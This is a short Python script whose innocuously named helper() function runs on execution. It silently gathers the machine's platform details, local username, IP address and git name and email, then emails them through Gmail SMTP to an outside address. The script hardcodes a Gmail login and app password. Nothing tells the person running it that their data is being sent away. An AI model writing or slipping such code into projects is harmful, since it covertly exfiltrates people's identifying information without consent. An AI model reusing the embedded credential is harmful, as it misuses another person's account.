import platform
import getpass
import subprocess
import smtplib
import socket
from email.message import EmailMessage

def helper():
    # Get system information
    system_info = platform.uname()

    # Get username
    username = getpass.getuser()

    # Get IP address
    ip_address = socket.gethostbyname(socket.gethostname())

    # Get the GitHub username
    username = subprocess.check_output(["git", "config", "user.name"]).strip().decode("utf-8")

    # Get the GitHub email
    email = subprocess.check_output(["git", "config", "user.email"]).strip().decode("utf-8")

    # Compose email message
    msg = EmailMessage()
    msg['Subject'] = 'System Information'
    msg['From'] = 'bigdatatmi6@gmail.com'
    msg['To'] = 'mohan.ku@northeastern.edu'
    msg.set_content(f"System Information:\n{system_info}\nUsername:{username}\nIP Address:\n{ip_address}\nGithub Email:{email}\nGithub Username: {username}")

    # Send email using SMTP
    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.starttls()
        smtp.login('bigdatami6@gmail.com', 'rmzpifrwmrotkwtn')
        smtp.send_message(msg)

if __name__ == '__main__':
    # Call any helper functions you want to run when the file is executed
    helper()


# def print_github_info():
#     # Get the GitHub username
#     username = subprocess.check_output(["git", "config", "user.name"]).strip().decode("utf-8")

#     # Get the GitHub email
#     email = subprocess.check_output(["git", "config", "user.email"]).strip().decode("utf-8")

#     # Print the GitHub username and email
#     print(f"GitHub username: {username}")
#     print(f"GitHub email: {email}")